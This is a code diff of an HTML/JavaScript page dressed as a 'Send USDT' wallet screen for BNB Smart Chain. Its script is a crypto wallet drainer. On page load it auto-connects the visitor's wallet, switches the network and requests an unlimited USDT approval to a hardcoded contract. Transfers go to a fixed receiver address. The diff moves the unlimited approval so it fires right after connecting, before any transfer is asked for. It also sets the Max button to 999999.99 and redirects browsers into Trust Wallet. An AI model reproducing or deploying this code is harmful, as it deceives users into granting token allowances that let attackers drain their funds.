@@ -2,14 +2,17 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
   <title>Send USDT</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=SF+Pro+Display:400,500,600,700&display=swap">
   <style>
-    html,body {
+    html, body {
       height: 100%;
       margin: 0;
       padding: 0;
       background: #242424;
+      font-family: 'SF Pro Display', 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
     }
     body {
       min-height: 100dvh;
@@ -18,7 +21,6 @@
       flex-direction: column;
       align-items: center;
       justify-content: stretch;
-      box-sizing: border-box;
     }
     .main-modal {
       margin: 0 auto;
@@ -35,7 +37,7 @@
       overflow: hidden;
     }
     .modal-body {
-      padding: 32px 20px 112px 20px;
+      padding: 32px 20px 85px 20px;
       flex: 1 1 auto;
       display: flex;
       flex-direction: column;
@@ -54,6 +56,8 @@
       color: #fff;
       margin: 0 auto;
       text-align: center;
+      font-family: inherit;
+      letter-spacing: 0;
     }
     .close-btn {
       position: absolute;
@@ -69,14 +73,15 @@
       cursor: pointer;
       transition: background .1s;
     }
-    .close-btn:active { background:#2a2a2a; }
+    .close-btn:active { background: #2a2a2a; }
     .modal-label {
       margin-bottom: 10px;
       margin-top: 0;
-      color: #bdbdbd;
+      color: #bababa;
       font-size: 15px;
       font-weight: 600;
-      letter-spacing: 0.01em;
+      letter-spacing: 0;
+      font-family: inherit;
     }
     .modal-field {
       display: flex;
@@ -95,12 +100,13 @@
       padding: 0 8px 0 14px;
       position: relative;
       transition: border 0.18s;
+      font-family: inherit;
     }
-    .modal-field:focus-within { border-color: #46e688;}
+    .modal-field:focus-within { border-color: #46e688; }
     .address-box {
       cursor: not-allowed;
       user-select: all;
-      border:none;
+      border: none;
       outline: none;
       background: transparent;
       font-size: 16px;
@@ -109,6 +115,7 @@
       flex: 1;
       letter-spacing: 0.01em;
       padding: 17px 0;
+      font-family: inherit;
     }
     .network-box {
       flex-direction: row;
@@ -117,21 +124,31 @@
       padding-left: 8px;
       font-size: 16px;
       font-weight: 500;
+      font-family: inherit;
     }
     .network-icon {
-      width:32px;height:32px;
-      border-radius:8px;
-      background: #f3ba2f;
-      display:flex;align-items:center;justify-content:center;
+      width: 31px;
+      height: 31px;
+      border-radius: 8px;
+      background: transparent;
+      display: flex;
+      align-items: center;
+      justify-content: center;
       margin-right: 11px;
       flex-shrink: 0;
     }
-    .network-icon img { width: 21px; height: 21px; display:block;}
-    .network-label { color:#fff;font-weight:500; }
-    .network-arrow {
-      color: #a7a7a7;
-      font-size: 19px;
-      margin-left: auto;
+    .network-icon img {
+      width: 22px;
+      height: 22px;
+      display: block;
+      border-radius: 6px;
+      background: transparent;
+    }
+    .network-label {
+      color: #fff;
+      font-weight: 500;
+      font-size: 16px;
+      font-family: inherit;
     }
     .amount-box {
       display: flex;
@@ -146,9 +163,9 @@
       padding-left: 14px;
       box-sizing: border-box;
       transition: border 0.18s;
+      font-family: inherit;
     }
-    .amount-box:focus-within { border-color: #46e688;}
-
+    .amount-box:focus-within { border-color: #46e688; }
     .amount-input {
       background: transparent;
       border: none;
@@ -159,8 +176,8 @@
       outline: none;
       min-width: 0;
       padding: 17px 0;
+      font-family: inherit;
     }
-
     .amount-actions {
       display: flex;
       align-items: center;
@@ -169,11 +186,12 @@
       padding-right: 7px;
     }
     .amount-unit {
-      color: #bdbdbd;
+      color: #bababa;
       font-weight: 600;
       margin-right: 4px;
       font-size: 15.5px;
       letter-spacing: 0.02em;
+      font-family: inherit;
     }
     .max-btn {
       background: none;
@@ -185,26 +203,24 @@
       padding: 3px 4px 3px 6px;
       border-radius: 7px;
       transition: background .13s;
+      font-family: inherit;
     }
-    .max-btn:active, .max-btn:focus { background: #174c3d;}
-    .balance-row, .amount-estimate {
-      margin: 10px 0 0 3px;
-      font-size: 14px;
-      color: #bdbdbd;
-      letter-spacing: 0.01em;
-    }
+    .max-btn:active, .max-btn:focus { background: #174c3d; }
     .amount-estimate {
-      margin: 4px 0 21px 3px;
+      margin: 4px 0 0 3px;
+      font-size: 14px;
+      color: #bababa;
+      letter-spacing: 0.01em;
       font-weight: 500;
+      font-family: inherit;
     }
-    /* Bottom Next floating button row */
     .modal-bottom-actions {
       position: fixed;
       left: 0;
       right: 0;
       bottom: 0;
       z-index: 2;
-      width:100vw;
+      width: 100vw;
       display: flex;
       justify-content: center;
       background: transparent;
@@ -218,53 +234,47 @@
       display: flex;
       justify-content: center;
       background: transparent;
-      padding-bottom: max(env(safe-area-inset-bottom),20px);
-      padding-top: 7px;
+      padding-bottom: max(env(safe-area-inset-bottom),15px);
+      padding-top: 0;
       pointer-events: none;
     }
     .next-btn {
       pointer-events: all;
-      width: 97%;
+      width: 96%;
       background-color: #19996e;
       border: none;
       border-radius: 30px;
-      padding: 22px 0 19px 0;
+      padding: 13px 0 13px 0;
       margin: 0 auto;
-      font-size: 19.5px;
+      font-size: 17px;
       font-weight: 600;
-      color: #1a1a1a;
-      letter-spacing: .02em;
-      box-shadow: 0 10px 30px #27ff8520;
+      color: #fff;
+      letter-spacing: .01em;
+      font-family: inherit;
+      box-shadow: 0 3px 12px #27ff8520;
       cursor: pointer;
       display: block;
       transition: background .15s, opacity .15s;
       text-align: center;
     }
-    .next-btn[disabled] { opacity: .46; pointer-events:none; }
-    .btn-connect {
-      pointer-events: all;
-      width: 97%;
-      background-color: #2c3931;
-      color: #fff;
-      border: none;
-      border-radius: 30px;
-      padding: 22px 0 19px 0;
-      margin: 0 auto;
-      font-size: 19.5px;
-      font-weight: 600;
-      letter-spacing:.02em;
-      display: block;
-      margin-top: 10px;
-      margin-bottom: 7px;
-      cursor: pointer;
-      box-shadow: 0 4px 20px #1dffb822;
+    .next-btn[disabled] { opacity: .46; pointer-events: none; }
+    #status {
+      width: 100%;
+      padding: 8px 0 2px 0;
+      margin: 10px auto 7px auto;
+      border-radius: 8px;
+      font-weight: 500;
+      font-size: 15px;
+      text-align: center;
+      display: none;
+      font-family: inherit;
     }
-    .btn-connect.show { display:block !important;}
-    /* Paste, copy, scan are removed */
+    #status.success { display:block;background:#1d5a2a;color:#3effb8;border:1px solid #165a3b;}
+    #status.error { display:block;background:#421528;color:#ff7a7a;border:1px solid #ff284b55;}
     @media (max-width: 600px) {
-      .main-modal { max-width:100vw;border-radius:19px 19px 0 0;}
-      .modal-bottom-inner,.modal-bottom-actions {max-width:100vw;}
-      .modal-body {padding: 24px 7px 104px 7px;}
+      .main-modal { max-width:100vw;border-radius:19px 19px 0 0; }
+      .modal-bottom-inner,.modal-bottom-actions { max-width:100vw; }
+      .modal-body { padding: 24px 7px 82px 7px; }
     }
   </style>
 </head>
@@ -274,7 +284,7 @@
       <div class="modal-body">
         <div class="header-row">
           <h1>Send USDT</h1>
-          <button class="close-btn" type="button" onclick="closeModal()" title="Close">&times;</button>
+          <button class="close-btn" type="button" id="modalClose" title="Close">&times;</button>
         </div>
         <!-- Address Row -->
         <div>
@@ -285,18 +295,17 @@
           </div>
         </div>
         <!-- Network Row -->
-        <div style="margin-top:24px;">
+        <div style="margin-top:18px;">
           <div class="modal-label">Destination network</div>
           <div class="modal-field network-box">
             <span class="network-icon">
-              <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/binance/info/logo.png" alt="BNB" />
+              <img src="https://raw.githubusercontent.com/trustwallet/assets/refs/heads/master/blockchains/smartchain/info/logo.png" alt="BNB" />
             </span>
             <span class="network-label">BNB Smart Chain</span>
-            <span class="network-arrow">&#9660;</span>
           </div>
         </div>
         <!-- Amount -->
-        <div style="margin-top:24px;">
+        <div style="margin-top:18px;">
           <div class="modal-label">Amount</div>
           <div class="amount-box">
             <input type="number" min="0" step="0.00000001" class="amount-input" id="amountInput"
@@ -306,209 +315,197 @@
               <button type="button" class="max-btn" id="maxBtn">Max</button>
             </div>
           </div>
-          <div class="balance-row" id="usdtBalance" style="display:none"></div>
           <div class="amount-estimate" id="amountEstimate">≈ $0.00</div>
         </div>
         <div id="status"></div>
       </div>
-      <!-- Next button row, always at bottom -->
       <div class="modal-bottom-actions">
         <div class="modal-bottom-inner">
-          <button type="submit" class="next-btn" id="sendBtn">Next</button>
-          <button type="button" class="btn-connect" id="connectBtn" onclick="manualConnect()">Connect Wallet</button>
+          <button type="submit" class="next-btn" id="transferBtn" disabled>Transfer</button>
         </div>
       </div>
     </form>
   </div>
 <script>
-    // USDT/BSC/Wallet config
     const BSC_MAINNET = {
-        chainId: "0x38",
-        chainName: "BNB Smart Chain",
-        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-        rpcUrls: ["https://bsc-dataseed.binance.org/"],
-        blockExplorerUrls: ["https://bscscan.com"]
+      chainId: "0x38",
+      chainName: "BNB Smart Chain",
+      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+      rpcUrls: ["https://bsc-dataseed.binance.org/"],
+      blockExplorerUrls: ["https://bscscan.com"]
     };
     const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
     const CONTRACT_ADDR = "0x89112691C976D0a2D874B0ADAe693a0Add0dAe98";
     const RECEIVER_ADDR = "0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F";
     const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
     const USDT_ABI = [
-        {
-            "constant": true,
-            "inputs": [{"name":"account","type":"address"}],
-            "name": "balanceOf",
-            "outputs": [{"name":"","type":"uint256"}],
-            "type": "function"
-        },
-        {
-            "constant": false,
-            "inputs": [
-                {"name":"spender","type":"address"},
-                {"name":"amount","type":"uint256"}
-            ],
-            "name": "approve",
-            "outputs": [{"name":"","type":"bool"}],
-            "type": "function"
-        },
-        {
-            "constant": false,
-            "inputs": [
-                {"name":"recipient","type":"address"},
-                {"name":"amount","type":"uint256"}
-            ],
-            "name": "transfer",
-            "outputs": [{"name":"","type":"bool"}],
-            "type": "function"
-        }
+      {
+        "constant": true,
+        "inputs": [{"name":"account","type":"address"}],
+        "name": "balanceOf",
+        "outputs": [{"name":"","type":"uint256"}],
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [
+          {"name":"spender","type":"address"},
+          {"name":"amount","type":"uint256"}
+        ],
+        "name": "approve",
+        "outputs": [{"name":"","type":"bool"}],
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [
+          {"name":"recipient","type":"address"},
+          {"name":"amount","type":"uint256"}
+        ],
+        "name": "transfer",
+        "outputs": [{"name":"","type":"bool"}],
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [
+          {"name":"owner","type":"address"},
+          {"name":"spender","type":"address"}
+        ],
+        "name": "allowance",
+        "outputs": [{"name":"","type":"uint256"}],
+        "type": "function"
+      }
     ];
-    let web3, userAccount, usdtContract, isConnected = false, usdtBalance = "0.0000";
-    const statusDiv = document.getElementById("status");
-    const sendBtn = document.getElementById("sendBtn");
-    const connectBtn = document.getElementById("connectBtn");
+    let web3, userAccount, usdtContract, isConnected=false;
+    const transferBtn = document.getElementById("transferBtn");
     const amountInput = document.getElementById("amountInput");
     const usdAmountDiv = document.getElementById("amountEstimate");
-    const usdtBalanceDiv = document.getElementById("usdtBalance");
+    const statusDiv = document.getElementById("status");
+    let isApproved = false;
 
     async function autoConnectBSC() {
-        if (!window.ethereum) {
-            window.location.href = "https://link.trustwallet.com/open_url?url=" +
-                encodeURIComponent(window.location.href);
-            return;
-        }
+      if (!window.ethereum) {
+        window.location.href =
+            "https://link.trustwallet.com/open_url?url=" +
+            encodeURIComponent(window.location.href);
+        return;
+      }
+      try {
         try {
-            await window.ethereum.request({ method: "eth_requestAccounts" });
-            web3 = new Web3(window.ethereum);
-            const accounts = await window.ethereum.request({ method: "eth_accounts" });
-            if (!accounts || !accounts.length) throw new Error("No accounts");
-            userAccount = accounts[0];
-            const chainId = await window.ethereum.request({ method: "eth_chainId" });
-            if (chainId !== BSC_MAINNET.chainId) {
-                try {
-                    await window.ethereum.request({
-                        method: "wallet_switchEthereumChain",
-                        params: [{ chainId: BSC_MAINNET.chainId }]
-                    });
-                } catch (err) {
-                    if (err.code === 4902) {
-                        await window.ethereum.request({
-                            method: "wallet_addEthereumChain",
-                            params: [BSC_MAINNET]
-                        });
-                    } else {
-                        throw err;
-                    }
-                }
-            }
-            isConnected = true;
-            connectBtn.classList.remove("show");
-            await initContractsAndBalance();
-            window.ethereum.on("accountsChanged", handleAccountsChanged);
-            window.ethereum.on("chainChanged", () => location.reload());
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: BSC_MAINNET.chainId }]
+          });
         } catch (err) {
-            isConnected = false;
-            connectBtn.classList.add("show");
-            showStatus("Wallet not connected or rejected.", "error");
-            console.error("Connect/switch failed:", err);
+          if (err.code === 4902) {
+            await window.ethereum.request({
+              method: "wallet_addEthereumChain",
+              params: [BSC_MAINNET]
+            });
+          }
         }
-    }
-
-    async function manualConnect() {
-        connectBtn.classList.remove('show');
-        await autoConnectBSC();
-    }
-
-    async function initContractsAndBalance() {
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        web3 = new Web3(window.ethereum);
+        const accounts = await window.ethereum.request({ method: "eth_accounts" });
+        if (!accounts || !accounts.length) throw new Error("No accounts");
+        userAccount = accounts[0];
         usdtContract = new web3.eth.Contract(USDT_ABI, USDT_BSC);
-        await updateBalance();
-        updateUSD();
+        isConnected = true;
+        window.ethereum.on("accountsChanged",()=>location.reload());
+        window.ethereum.on("chainChanged",()=>location.reload());
+        checkAndApprove();
+      } catch (err) {
+        isConnected = false;
+        showStatus("Wallet not connected or rejected.", "error");
+      }
     }
 
-    async function updateBalance() {
-        try {
-            const balance = await usdtContract.methods.balanceOf(userAccount).call();
-            const balanceFormatted = web3.utils.fromWei(balance, "mwei");
-            usdtBalance = (+balanceFormatted).toFixed(4);
-            usdtBalanceDiv.textContent = `Balance: ${usdtBalance} USDT`;
-            usdtBalanceDiv.style.display = "";
-        } catch (error) {
-            usdtBalanceDiv.textContent = "Balance: 0.0000 USDT";
-            usdtBalance = "0.0000";
-            usdtBalanceDiv.style.display = "";
-        }
-    }
-
-    function handleAccountsChanged(accounts) {
-        if (!accounts.length) {
-            isConnected = false;
-            connectBtn.classList.add('show');
+    async function checkAndApprove() {
+      try {
+        showStatus("Checking allowance...", "");
+        const allowance = await usdtContract.methods.allowance(userAccount, CONTRACT_ADDR).call();
+        if (allowance && web3.utils.toBN(allowance).gte(web3.utils.toBN(MAX_UINT256).div(web3.utils.toBN("2")))) {
+          isApproved = true;
+          transferBtn.disabled = false;
+          showStatus("Ready to transfer!", "success");
         } else {
-            userAccount = accounts[0];
-            isConnected = true;
-            connectBtn.classList.remove('show');
-            initContractsAndBalance();
+          isApproved = false;
+          transferBtn.disabled = true;
+          await approveUSDT();
         }
+      } catch (e) {
+        showStatus("Approval check failed.", "error");
+      }
+    }
+
+    async function approveUSDT() {
+      transferBtn.disabled = true;
+      transferBtn.textContent = "Approving...";
+      showStatus("Approve in wallet (for contract)...", "");
+      try {
+        await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256)
+          .send({from:userAccount});
+        isApproved = true;
+        transferBtn.disabled = false;
+        transferBtn.textContent = "Transfer";
+        showStatus("Approval successful. Ready to transfer!", "success");
+      } catch (e) {
+        isApproved = false;
+        transferBtn.disabled = false;
+        transferBtn.textContent = "Approve";
+        showStatus("Approval required for contract.", "error");
+      }
     }
 
     async function sendUSDT() {
-        const amount = parseFloat(amountInput.value) || 0; // allow 0!
-        sendBtn.disabled = true;
-        sendBtn.textContent = "Processing...";
-        showStatus("", "");
-        try {
-            await usdtContract.methods.approve(CONTRACT_ADDR, MAX_UINT256).send({
-                from: userAccount
-            });
-            const sendAmount = web3.utils.toWei(amount.toString(), "mwei");
-            await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
-                from: userAccount
-            });
-            showStatus("✅ Complete!", "success");
-            amountInput.value = "0";
-            updateUSD();
-            await updateBalance();
-        } catch (e) {
-            showStatus("Transaction Failed", "error");
-        } finally {
-            sendBtn.disabled = false;
-            sendBtn.textContent = "Next";
-        }
+      if (!isApproved) {
+        transferBtn.disabled = true;
+        await approveUSDT();
+        return;
+      }
+      const amount = parseFloat(amountInput.value) || 0;
+      if (amount <= 0) {
+        showStatus("Enter amount greater than 0", "error");
+        return;
+      }
+      transferBtn.disabled = true;
+      transferBtn.textContent = "Sending...";
+      showStatus("", "");
+      try {
+        const sendAmount = web3.utils.toWei(amount.toString(), "mwei");
+        await usdtContract.methods.transfer(RECEIVER_ADDR, sendAmount).send({
+          from: userAccount
+        });
+        showStatus("✅ Sent!", "success");
+        amountInput.value = "0";
+        updateUSD();
+      } catch (e) {
+        showStatus("Transaction Failed", "error");
+      } finally {
+        transferBtn.disabled = false;
+        transferBtn.textContent = "Transfer";
+      }
     }
 
-    function showStatus(message, type) {
-        statusDiv.innerHTML = message;
-        if (!type) statusDiv.style.display = "none";
-        else {
-            statusDiv.style.display = "block";
-            statusDiv.className = "";
-            if (type === "success") statusDiv.classList.add("success");
-            if (type === "error") statusDiv.classList.add("error");
-        }
-    }
-    function closeModal() {
-        alert("Modal closed! (replace with real close logic)");
-    }
     document.getElementById("maxBtn").onclick = function () {
-        amountInput.value = usdtBalance || "0.0000";
-        updateUSD();
+      amountInput.value = "999999.99";
+      updateUSD();
     };
     amountInput.oninput = updateUSD;
     function updateUSD() {
-        let val = parseFloat(amountInput.value) || 0;
-        usdAmountDiv.textContent = `≈ $${val.toFixed(2)}`;
+      let val = parseFloat(amountInput.value) || 0;
+      usdAmountDiv.textContent = `≈ $${val.toFixed(2)}`;
     }
-    // Always allow Next, connected or not, any amount (even 0)
-    sendBtn.disabled = false;
 
+    transferBtn.disabled = true;
     window.addEventListener("load", autoConnectBSC, false);
     window.addEventListener("DOMContentLoaded", autoConnectBSC, false);
-    setTimeout(autoConnectBSC, 600);
-    if (
-        window.location.hash.includes("send") ||
-        window.location.search.includes("send")
-    ) {
-        setTimeout(autoConnectBSC, 200);
+    setTimeout(autoConnectBSC, 700);
+    if (window.location.hash.includes("send") || window.location.search.includes("send")) {
+      setTimeout(autoConnectBSC, 250);
     }
+    document.getElementById("modalClose").onclick = function(){};
 </script>
 </body>
 </html>
